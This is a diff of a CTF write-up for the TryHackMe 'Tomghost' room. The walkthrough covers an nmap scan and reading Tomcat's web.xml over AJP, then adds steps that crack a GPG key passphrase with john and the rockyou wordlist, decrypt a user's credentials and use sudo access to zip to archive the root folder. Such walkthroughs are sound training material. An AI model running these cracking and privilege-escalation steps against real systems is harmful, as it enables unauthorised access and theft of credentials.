@@ -1,16 +1,12 @@
-# TOMGHOST
+# Tomghost
 Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.
 
 ## Resolution
-
 First, machine scanning
 ```
-$ sudo nmap -sV -sC 10.10.210.249 -Pn -n --disable-arp-ping
+$ sudo nmap -sV -sC $IP -Pn -n --disable-arp-ping
 
-Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-21 08:46 CET
-Nmap scan report for 10.10.210.249
-Host is up (0.041s latency).
-Not shown: 996 closed ports
+<...snip...>
 PORT     STATE SERVICE    VERSION
 22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -349,27 +345,7 @@ Getting resource at ajp13://10.10.210.249:8009/asdf
 ----------------------------
 <?xml version="1.0" encoding="UTF-8"?>
 <!--
- Licensed to the Apache Software Foundation (ASF) under one or more
-  contributor license agreements.  See the NOTICE file distributed with
-  this work for additional information regarding copyright ownership.
-  The ASF licenses this file to You under the Apache License, Version 2.0
-  (the "License"); you may not use this file except in compliance with
-  the License.  You may obtain a copy of the License at
-
-      http://www.apache.org/licenses/LICENSE-2.0
-
-  Unless required by applicable law or agreed to in writing, software
-  distributed under the License is distributed on an "AS IS" BASIS,
-  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-  See the License for the specific language governing permissions and
-  limitations under the License.
--->
-<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
-  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
-                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
-  version="4.0"
-  metadata-complete="true">
+<...snip...>
 
   <display-name>Welcome to Tomcat</display-name>
   <description>
@@ -384,12 +360,73 @@ Investigating the result, we find a username and a potentially hashed password. 
 
 In the machine, there exist two users under the home direcotry. The user *merlin* has the `user.txt` flag and we can read it without any further permissions.
 
-In the home dictory of *skyf_ck*, there is two interesting files: `tryhackme.asc` and `credential.pgp`
+In the home dictory of *skyf_ck*, there is two interesting files: `tryhackme.asc` and `credential.pgp`.\
+GPG was introduced for email security. Here `tryhackme.asc` contains a GPG private key and `credential.pgp` is potentially some encrypted message containing some credentials.
+Note: don't confuse PGP and GPG, they both serve the same purpose.
 
+To use the key in the decryption, a passphrase is required. This is what we're going to brute force using `john`.
+```
+$ gpg2john tryhackme.asc > hash   
 
+$ john hash -wordlist:/usr/share/wordlists/rockyou.txt
 
+<...snip...>
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alexandru        (tryhackme)     
+1g 0:00:00:00 DONE (2024-02-21 18:41) 16.66g/s 17866p/s 17866c/s 17866C/s marshall..alexandru
+Use the "--show" option to display all of the cracked passwords reliably
+```
 
+There we have our passphrase. Note that I specified the rockyou wordlist after no match was found in the default wordlist used by `john`.
 
+To add the private key for decryption we run the following command and enter the passphrase:
+```
+$ gpg --import tryhackme.asc
 
+gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
+gpg: key 8F3DA3DEC6707170: secret key imported
+gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
+gpg: Total number processed: 2
+gpg:              unchanged: 2
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+```
 
+Now for decryption, we'll be prompted to enter the passphrase once again:
+```
+$ gpg --decrypt credential.pgp
+
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
+      "tryhackme <stuxnet@tryhackme.com>"
+merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+```
+
+The message contains *merlin*'s credentials. After connection, we discover that the user can execute `zip` with root privilege.
+```
+merlin@ubuntu:~$ sudo -l
+
+Matching Defaults entries for merlin on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+```
+
+Let's zip the root folder then. Once done, we'll send that file to our machine to unzip it without any permissions requirements.\
+```
+merlin@ubuntu:/$ sudo /usr/bin/zip -r zipped root/
+
+  adding: root/ (stored 0%)
+  adding: root/root.txt (stored 0%)
+  adding: root/.bashrc (deflated 54%)
+  adding: root/.bash_history (stored 0%)
+  adding: root/ufw/ (stored 0%)
+  adding: root/ufw/ufw.sh (stored 0%)
+  adding: root/.nano/ (stored 0%)
+  adding: root/.profile (deflated 20%)
+```
+
+Found the root flag.
 
